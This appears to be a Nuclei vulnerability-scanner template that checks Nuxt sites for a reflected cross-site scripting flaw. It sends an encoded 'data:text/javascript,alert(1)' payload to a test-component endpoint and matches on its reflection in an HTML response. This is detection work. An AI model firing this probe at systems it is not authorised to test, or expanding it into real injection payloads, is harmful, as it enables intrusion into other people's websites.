id: nuxt-xss

info:
  name: Nuxt XSS
  author: reewardius
  severity: medium
  tags: xss

http:
  - method: GET
    path:
      - "{{BaseURL}}/__nuxt_component_test__/?path=data%3Atext%2Fjavascript%2Calert%281%29%3B"
      
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "data:text/javascript,alert(1);"
        part: body
        
      - type: word
        part: header
        words:
          - text/html
          
      - type: word
        words:
          - "Unable to find a route to match the URI: __nuxt_component_test__"
        part: body
        negative: true